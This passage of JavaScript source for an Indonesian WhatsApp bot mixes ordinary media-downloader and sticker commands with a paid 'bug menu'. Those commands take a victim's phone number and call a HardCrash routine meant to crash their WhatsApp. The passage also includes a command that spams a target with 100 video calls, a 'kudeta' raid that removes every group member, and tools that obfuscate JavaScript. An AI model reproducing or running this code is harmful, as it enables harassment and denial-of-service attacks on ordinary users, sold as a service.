await drayyy.sendMessage(m.chat, {audio: {url: almiratobrut}, mimetype: 'audio/mp4', ptt: true}, {quoted: m })
break

case "developer": {
await drayyy.sendMessage(m.chat, { react: { text: "🎭",key: m.key,}}); 
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./another/hello.jpeg") }, { upload: drayyy.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `🐉々𝐂̤𝐫͞𝐞͢𝐚͛𝐭𝐨̵̈́͟𝐫〪〫 𝐒͢𝐜͡𝐫͓𝐢͓𝐩̵͂𝐭̲ㇱ 🐉`,
}), 
contextInfo: {}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Contact Developer Another🎭*`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                 
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Whatsapp\",\"url\":\"https://wa.me/6283151568511\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"https://t.me/xdrayyy\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Saluran Whatsapp\",\"url\":\"https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {quoted: qmime})
await drayyy.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}

break

//======================[ BUG MENU ]======================================//
  const qelek = {

    key: {

      remoteJid: "status@broadcast",

      participant: "0@s.whatsapp.net"

    },

    message: {

      "extendedTextMessage": {

        "text": `Command: ${command}

Target: ${pepec}`

      }

    }

  }  

//ANDRO
case 'invisix':
case 'dryx':
case 'mention-crash':
case 'flow-beta':
case 'firewall':
case 'force-system':
case 'crash-status': 
case 'floods-crash': 
case 'execution':
case 'python': { // BUG HARD

if (!isPremium && !isOwner && !isUnli) return reply(mess.premium)
if (!q) {
reply(`Penggunaan ${prefix + command} 628xxx`)
} else {
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'

let tekk = `Sukses mengirim buk wangsaff🤞
𝚃𝚊𝚛𝚐𝚎𝚝: ${pepec}
𝙲𝚘𝚖𝚖𝚊𝚗𝚍: ${command}`
    let blockedNum = nomerCreator;
if (target === blockedNum) {
	reply('bro mencoba ngebug developer🐭');
	} else {
  await drayyy.sendMessage(m.chat, { react: { text: "✅",key: m.key,}}), 
  
  
await drayyy.sendMessage(
   m.chat,
    {
        product: {
            productImage: { url: "https://files.catbox.moe/9y1fo6.jpeg" }, //or buffer
            productImageCount: 1,
            title: "Another - 3.0",
            description: "Succes sending bug...",
            priceAmount1000: 20000 * 1000,
            currencyCode: "IDR",
            retailerId: "Retail",
            url: "https://Bít.ly/Drayxd",            
        },
        businessOwnerJid: "6283891457614@s.whatsapp.net",
        caption: tekk, //Additional information
        title: "",
        footer: "",
        media: true,
        interactiveButtons: [
             {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                     display_text: "Cek Target",
                     url: `https://wa.me/${pepec}`
                })
             }
        ]
    
  },
  {
    quoted : m
  }
)

		try{
{
HardCrash(target)
}
} catch (err) {
    console.erorr(err);
    }
}
}
    }
break

case 'blank-stc':
case 'super-crash': 
case 'stuckapp': 
case 'dinamica':
case 'galaxy-crash': { // BUG HARD

if (!isPremium && !isOwner && !isUnli) return reply(mess.premium)
if (!q) {
reply(`Penggunaan ${prefix + command} 628xxx`)
} else {
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
let tekk = `Sukses mengirim buk wangsaff🤞
𝚃𝚊𝚛𝚐𝚎𝚝: ${pepec}
𝙲𝚘𝚖𝚖𝚊𝚗𝚍: ${command}`
const blockedNum = nomerCreator;
if (target === blockedNum) {
	reply('bro mencoba ngebug developer🐭');
    
	} else {
  await drayyy.sendMessage(m.chat, { react: { text: "✅",key: m.key,}}), 
  
  

await drayyy.sendMessage(
   m.chat,
    {
        product: {
            productImage: { url: "https://files.catbox.moe/9y1fo6.jpeg" }, //or buffer
            productImageCount: 1,
            title: "Another - 3.0",
            description: "Succes sending bug...",
            priceAmount1000: 20000 * 1000,
            currencyCode: "IDR",
            retailerId: "Retail",
            url: "https://Bít.ly/Drayxd",            
        },
        businessOwnerJid: "6283891457614@s.whatsapp.net",
        caption: tekk, //Additional information
        title: "",
        footer: "",
        media: true,
        interactiveButtons: [
             {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                     display_text: "Cek Target",
                     url: `https://wa.me/${pepec}`
                })
             }
        ]
    
  },
  {
    quoted : m
  }
)

		try{
{
HardCrash(target)
}
} catch (err) {
    console.erorr(err);
    }
}
}
    }
break 

case "fc-inplace": {
await HardCrash(m.chat) 
    }
break
   
                
async function sendOfferVideoCall(target) {
    try {
        await drayyy.offerCall(target, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}
  
 case 'spamtelp':              
 case 'scall':          
 case 'spamcall': { // SPAM TELP
if (!isverificationResult) return dbreply(`*❌ ILLEGAL BOT AKSES*\n> Bot numbers are not registered in the database\nBuy Script?? Klik tombol dibawah`)
if (!isPrem) return reply(`*Only Premium Member*`)
if (!q) {
reply(`Penggunaan ${prefix + command} 628xxx`)
} else {
const blockedNum = '6283891457614@s.whatsapp.net';
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
if (target === blockedNum) {
	reply('*Developernya seleb kocak, gabakal diangkat telp gw👺*');
	} else {
await drayyy.sendMessage(m.chat, { react: { text: "📲",key: m.key,}}),
await sleep(1500)
await drayyy.sendMessage(m.chat, { react: { text: "🎉",key: m.key,}}); 
            reply(`*Succes spam call to target📞*\n\n> Target:${pepec}\n\n© Another-2.0 ͒͌`) 
            drayyy.sendMessage(target, {text: `halo mass`});
for (let i = 0; i < 100; i++) {
sendOfferVideoCall(target)

await sleep(2000)
}            
 drayyy.sendMessage(target, {text: `halo mass`});
}
}
    }
break
 
 //==========[ END BUG MENU ]==========//

//==========( TOOLS MENU )=============//
  case "ig": {
if (!q) return reply("Mana Linknya?")
if (!q.startsWith('https://')) return m.reply("Link tautan tidak valid")
await drayyy.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.neekoi.me/api/igdl?url=${text}`),then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await drayyy.sendMessage(m.chat, {video: {url: res.result[0].url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await drayyy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

  case "tiktokmp3": case "ttmp3": {
if (!q) return m.reply("Mana Linknya?")
if (!q.startsWith('https://')) return m.reply("Link tautan tidak valid")
await drayyy.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await drayyy.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await drayyy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

  case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return reply("Usage:\nid good night")
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!q) return reply("Usage:\nid good night")
if (args.length < 1) return reply("Usage:\nid good night")
if (!m.quoted.text) return reply("Usage:\nid good night")
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return reply("Usage:\nBahasa Yang Mau Kalian Translate + Teks\nContoh: en Selamat Siang")
}}
break
  case "stickerwm": case "wm": {
if (!q) return m.reply("Usage:\nNamamu dengan kirim media")
if (!/image|video/gi.test(mime)) return m.reply("Usage:\nNamamu dengan kirim media")
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await drayyy.downloadAndSaveMediaMessage(qmsg)
await drayyy.sendImageAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break
case "kudeta": {
 if (!isGroup) return reply("Khusus Dalam Grup")
    if (!isOwner) return reply(mess.ketua)
    let memberFilter = await groupMembers.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
    if (memberFilter.length < 1) return m.reply("Group Ini Tidak Ada Member . . .")
    await m.reply("Kudeta Group by drayyy")
    for (let i of memberFilter) {
    await drayyy.groupParticipantsUpdate(m.chat, [i], 'remove')
    await sleep(1000)
    }
    await m.reply("Raid Succesful")
    }
    break
              case "s": 
            case "sticker": 
            case "stiker": {            
                if (/image/.test(mime)) {
                    let media = await quoted.download();
                    let Encmedia = await drayyy.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) {
                        return reply(`Reply gambar dengan keterangan/caption ${prefix+command}\nJika media yang ingin dijadikan sticker adalah video, batas maksimal durasi Video 1-9 Detik`);
                    }
                    let media = await quoted.download();
                    let encmedia = await drayyy.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                } else {
                    reply(`Reply gambar dengan keterangan/caption ${prefix+command}\nDurasi Video 1-9 Detik`);
                }
            }
            break
case "toaudio": case "tomp3": {
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply("Mana Videonya?")
if ((qmsg).seconds > 30) return m.reply("Durasi vidio maksimal 30 detik")
m.reply(msg.wait)
await drayyy.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toAudio(res, 'mp4')
drayyy.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg'}, {quoted : m}) 
})
}
break
            case "toimage": 
            case "toimg": {
                if (!/webp/.test(mime)) {
                    return reply(`Reply/Balas stiker dengan teks: *${prefix + command}*`);
                }
                
                let media = await drayyy.downloadAndSaveMediaMessage(qmsg);
                let ran = await getRandom('.png');
                
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media);
                    if (err) return err;
            
                    let buffer = fs.readFileSync(ran);
                    drayyy.sendMessage(m.chat, { image: buffer }, { quoted: m });
                    fs.unlinkSync(ran);
                });
            }
            break
  case "ssweb": {
if (!q) return reply("https://example.com")
if (!isUrl(text)) return reply("https://example.com")
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
var data = await screenshotV2(text)
await drayyy.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break
//==================================================================//
//============\\
case "gpt": {
  if (!q) return m.reply(`Hai, apa yang ingin saya bantu?`)
async function openai(text, logic) {
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000, 
            "tokenLimit": 8000, 
            "completionTokenLimit": 5000, 
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let respondNya = await openai(text, "")
m.reply("*Jawaban Dari AI*\n" + respondNya)
}
break
 case "dec": case "decrypt": {
const { webcrack } = await import('webcrack');
const usage = `Contoh:
${command} (Input text or reply text to dec code)
${command} doc (Reply to a document)`;

if (!isPrem) return reply('Khusus Premium');

let text;
if (args.length >= 1) {
text = args.join(" ");
} else if (m.quoted && m.quoted.text) {
text = m.quoted.text;
} else {
return reply(usage);
}

try {
let message;
if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
let docBuffer;
if (m.quoted.mimetype) {
docBuffer = await m.quoted.download();
}
message = await webcrack(docBuffer.toString('utf-8'));
} else {
message = await webcrack(text);
}

const filePath = './@sampah_decrypt_drayyybot';
fs.writeFileSync(filePath, message.code);
await drayyy.sendMessage(m.chat, {
document: {
url: filePath
},
mimetype: 'application/javascript',
fileName: 'Dec By © drayyybot'
}, {quoted: m});

} catch (error) {
const errorMessage = `Terjadi kesalahan: ${error.message}`;
await reply(errorMessage);
}
}
break

case "encrypt": {
if (!m.quoted) return reply("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@enc${filename}.js`, media)
await m.reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@enc${filename}.js`).toString(), {
  target: "node",
  preset: "low"
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@enc${filename}.js`, obfuscated)
  await drayyy.sendMessage(m.chat, {document: fs.readFileSync(`./@enc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File Sukses!"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
}
break
case "encryptmed": {
if (!m.quoted) return reply("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@encXM${filename}.js`, media)
await m.reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@encXM${filename}.js`).toString(), {
  target: "node",
  preset: "medium"
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@encXM${filename}.js`, obfuscated)
  await drayyy.sendMessage(m.chat, {document: fs.readFileSync(`./@encXM${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File Sukses!"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
}
break
case "encrypthard": {
if (!m.quoted) return reply("Reply file .js")
if (mime !== "application/javascript") return m.reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
          target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "htmldrayyy" + 
            "YxYXyX";

        function unidentifiedReplacer(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function randomString(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return unidentifiedReplacer(originalString) + randomString(2);
    },
    renameVariables: true,
    renameGlobals: true,
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,
    shuffle: {
        hash: false,
        true: false
    },
    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await drayyy.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\n Hard Encryption"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
}
break

case "qc": {
const quoteApi = require('@neoxr/quote-api')
const { Sticker } = require('wa-sticker-formatter')
        if (!q) m.reply(`Example: ${prefix + command} halo`);
        let avatar = await drayyy.profilePictureUrl(m.sender, 'image').catch(_ => 'https://i.ibb.co/2WzLyGk/profile.jpg')

const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#2E4053",
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": pushname,
        "photo": {
          "url": avatar
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
}

async function createSticker(req, url, packName, authorName, quality) {
  let stickerMetadata = {
    type: 'full',
    pack: packName,
    author: authorName,
    quality
  }
  return (new Sticker(req ? req : url, stickerMetadata)).toBuffer()
}

const res = await quoteApi(json)
const buffer = Buffer.from(res.image, 'base64')
      let stiker = await createSticker(buffer, false, "Hann", "Hann")
      drayyy.sendFile(m.chat, stiker, 'sticker.webp', '', m)
  }
  break
  case "cekidch": {
if (!q) return reply(" Mana Link CH Nya ")
if (!q.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await drayyy.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break
 // End Tools Menu , Start Search & Play Menu //
case "play": {
if (!q) return m.reply('Example\n> .play Pulang - Waliband')
m.reply(`Proses`);
try {
let search = await yts(text);
let firstVideo = search.all[0];
let ytNye = await fetchJson(`https://api.agatz.xyz/api/ytmp3?url=${firstVideo.url}`)
let final =  ytNye.data[0];
await drayyy.sendMessage(m.chat, {
            audio: {
            url: final.downloadUrl
            },
            mimetype: "audio/mp4",
            contextInfo: {
              externalAdReply: {
              showAdAttribution: true,
              title: firstVideo.title || "Untitled",
              body: `drayyybot`,
              sourceUrl: firstVideo.url,
              thumbnailUrl: firstVideo.thumbnail || "https://example.com/default_thumbnail.jpg",
              mediaType: 1,
              renderLargerThumbnail: true
}
  }
  }, { quoted: Catalems });
} catch (e) {
  console.log(e)
  return reply(mess.error)
}
}
break
case "spotify":
  if (!q) return m.reply(`Urlnya mana?\n*Contoh:* ${prefix + command} https://open.spotify.com/track/xxxxxx`)
  drayyy.sendMessage(m.chat, { react: { text: '👒', key: m.key }})
  let urlSpo = linkRegex.test(text)
  if (!urlSpo) return m.reply(`Hanya Support Url Track *(music)*\n*Contoh Url:* https://open.spotify.com/track/xxxxxx`)
  let response = await spotifyDown(text)
  let { nama, title, durasi, thumb, url } = response
  
  if (response) {
  let cap = `*© 𝖲𝗉𝗈𝗍𝗂𝖿𝗒 𝖬𝗎𝗌𝗂𝖼*

*[🏷️] Info Music*
* *Title:* ${title}
* *Durasi:* ${durasi}
* *Artis:* ${nama}
* *Spotify:* ${text}

\`Kamu Dapat Mencari Music Spotify\`\n*Caranya:* ${prefix}playspotify <music name>`
  await drayyy.sendMessage(m.chat, { text: cap, contextInfo: { mentionedJid: [m.sender], externalAdReply: { mediaUrl: '', mediaType: 1, title: title, body: '© drayyybot', thumbnailUrl: thumb, sourceUrl: '', renderLargerThumbnail: true, showAdAttribution: false } } }, { quoted: m });
 drayyy.sendMessage(m.chat, { audio: { url: url }, mimetype: 'audio/mp4' }, { quoted: m })
  } else {
     m.reply(eror)
    }
  break
 case "playspotify": {
				if (!q) return m.reply(`*Masukan Judul Lagu!*\n\nContoh :\n${prefix + command} Juice Wrld`)
				drayyy.sendMessage(m.chat, { react: { text: '⏰', key: m.key }})
				try {
					let anu = await searchSpotifyTracks(text)
					let anuu = anu[0]
					let spotify = await spotifyDl(anuu.external_urls.spotify)
					await drayyy.sendMessage(m.chat, {
						audio: {
							url: spotify.result.music
						},
						mimetype: 'audio/mpeg',
						contextInfo: {
							forwardingScore: 9999999,
							isForwarded: true,
							externalAdReply: {
								title: "乂 Spotify - Player",
								body: `${spotify.result.author} - ${spotify.result.title} © drayyybot`,
								mediaType: 1,
								previewType: 0,
								renderLargerThumbnail: true,
								thumbnailUrl: spotify.result.thumb,
								sourceUrl: anuu.external_urls.spotify
							}
						}
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			
				case "ytsearch": {
				if (!q) return reply(`Contoh : ${prefix + command} Review SC drayyybot`)
				try {
					let search = await ytdl.search(text)
					let uii = await search.results
					let teks = '*Hasil YouTube Search*\n\n'
					let no = 1
					for (let i of uii.filter(objek => objek.type === "video")) {
						teks += `*⌬ Nomor:* ${no++}\n*⌬ Type:* ${i.type}\n*⌬ Video ID:* ${i.videoId}\n*⌬ Title:* ${i.title}\n*⌬ View:* ${i.views}\n*⌬ Duration:* ${i.timestamp}\n*⌬ Upload At:* ${i.ago}\n*⌬ Links:* ${i.url}\n─────────────────\n`
					}
					drayyy.endMessage(m.chat, {
						image: {
							url: uii[0].thumbnail
						},
						caption: teks
					}, {
						quoted: m
					})
			        } catch (err) {
			            console.log(err);
				}
			}
			break
			
 case "ttsearch": {
				if (!q) return reply(`*Masukan Query*:\n\nContoh:\n${prefix+command} jj epep`)
				await drayyy.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let tiktoks = await tiktokSearchVideo(text)
					let teks = "*</> TIKTOK SEARCH </>*\n\n"
					let no = 1
					for (let i of tiktoks.videos) {
						let sut = await JSON.stringify(i.author)
						teks += `*Video Info* :
- Nomor : ${no++}
- Username : ${i.author.unique_id}
- Nickname : ${i.author.nickname}
- Duration : ${i.duration} detik

*Statistik Info* :
- Views : ${i.play_count}
- Likes : ${i.digg_count}
- Comment : ${i.comment_count}
- Share : ${i.share_count}

*Caption* :
${i.title}

*Links Video* :
https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}

─────────────────
`
					}
					drayyy.sendMessage(m.chat, {
						video: {
							url: `https://tikwm.com${tiktoks.videos[0].play}`
						},
						caption: teks
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
 case "pin": case "pinterest": {
if (!q) return reply("Example usage:\nSunset backgrohnd")
await drayyy.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: drayyy.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await drayyy.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await drayyy.sendMessage(m.chat, {react: {text: '🖕🏼', key: m.key}})
}
break

 			case "ytmp3": {
				if (!q) return reply(`*Penggunaan salah!*\n\nContoh:\n${prefix + command} linknya`)
				if (!q.match('youtu')) return reply('Link Kamu Salah!')
				await drayyy.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				YouTubeMp3(args[0], args[1])
			}
			break
case "ytmp4": {
				if (!q) return reply(`*Penggunaan salah!*\n\nContoh:\n${prefix + command} linknya`)
				if (!q.match('youtu')) return reply('Link Tidak Terdeteksi\n🖕🏽!')
				await drayyy.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				YouTubeMp4(args[0], args[1])
			}
			break

case "mediafire":
  if (!q) return m.reply('Masukkan link MediaFire');
  const link = q;
  mediafireDownload(link, m);
  break
async function mediafireDownload(link, m) {
  try {
    const response = await axios.get(link);
    const $ = cheerio.load(response.data);
    const fileLink = $('a.download-button').attr('href');
    const fileName = $('div.filename').text();

    if (fileLink && fileName) {
      const fileBuffer = await axios.get(fileLink, { responseType: 'arraybuffer' });
      const media = new MessageMedia(fileName, fileBuffer.data, fileName);
      await m.sendMessage(media, MessageType.media);
    } else {
      m.reply('Gagal mengunduh file MediaFire');
    }
  } catch (error) {
    console.error(error);
    m.reply('Gagal mengunduh file MediaFire');
  }
}
break
case "tiktok": {
async function tiktok(query) {
 return new Promise(async (resolve, reject) => {
 try {
 const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

 const response = await axios({
 method: 'POST',
 url: 'https://tikwm.com/api/',
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'Cookie': 'current_language=en',
 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
 },
 data: encodedParams
 });
 const videos = response.data.data;
 const result = {
 title: videos.title,
 cover: videos.cover,
 origin_cover: videos.origin_cover,
 no_watermark: videos.play,
 watermark: videos.wmplay,
 music: videos.music
 };
 resolve(result);
 } catch (error) {
 reject(error);
 }
 });
}
if (args.length == 0) return m.reply(`Input link tiktok.*`)
if (!isUrl(args[0])) return m.reply('*Link yang kamu masukin, bukan link tiktok.*')
reply("Proses..")
let cap = ``
let res = await tiktok(`${args[0]}`)
drayyy.sendMessage(m.chat, { video: { url: res.no_watermark }, caption: cap, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
drayyy.sendMessage(m.chat, { audio: { url: res.music }, fileName: `drayyyxtok.mp3`, mimetype: 'audio/mp4' })
})
}
break
//>>>>>>>>>>>{ GROUP MENU }<<<<<<<<<<<<<<//

case "welcome": {
if (!isOwner) return reply(mess.ketua)
if (!q) return m.reply(`Example *.welcome* on/off`)
if (/on/.test(text)) {
global.welcome = true
m.reply("Berhasil menyalakan welcome")
} else if (/off/.test(text)) {
global.welcome = false
m.reply("Berhasil mematikan welcome")
} else {
return m.reply(`Example *.welcome* on/off`)
}
}
break 
case "antilink": {
if (!isOwner) return reply(mess.ketua)
if (!q) return m.reply(`Example *.antilink* on/off`)
if (/on/.test(text)) {
global.antilink = true
m.reply("Berhasil menyalakan antilink")
} else if (/off/.test(text)) {
global.antilink = false
m.reply("Berhasil mematikan antilink")
} else {
return m.reply(`Example *.antilink* on/off`)
}
}
break 
case "bratsticker": {
             if (!q) return reply(`Masukkan teks\n\nContoh:    ${prefix + command} Atmin Ganteng`);
            let EpBrat = `https://rayhanzuck.vercel.app/api/tools/brat?text=${encodeURIComponent(q)}`;
try {
const res = await axios.get(EpBrat, { responseType: 'arraybuffer' });
const buffer = Buffer.from(res.data, 'binary');
await drayyy.sendImageAsSticker(m.chat, buffer, m, { packname: `drayyyn`, author: ` $err` });
} catch (e) {
console.log(e);
await reply(`Sedang maintenance atau API error`);
    }
}
break

// End, Start Group Menu //

      case "listgc": {
let gcall = Object.values(await drayyy.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
drayyy.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: CR, title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.url2, previewType: "PHOTO"}}}, {quoted: Catalems})
}
break
case "resetlinkgc": {
if (!isOwner) return m.reply(mess.ketua)
if (!isOwner && !isAdmins) return reply("Khusus Admin")
if (!isBotAdmins) return reply("Khusus Admin")
await drayyy.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break
case "linkgc": {
if (!isOwner) return reply(mess.ketua)
if (!isOwner && !isAdmins) return reply("Khusus Admin")
if (!isBotAdmins) return reply("Khusus Admin")
const urlGrup = "https://chat.whatsapp.com/" + await drayyy.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await drayyy.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break
case "tagall": case "tag": {
if (!isGroup) return m.reply(" Khusus Dalam Group ")
if (!isAdmins && !isOwner) return m.reply(mess.ketua)
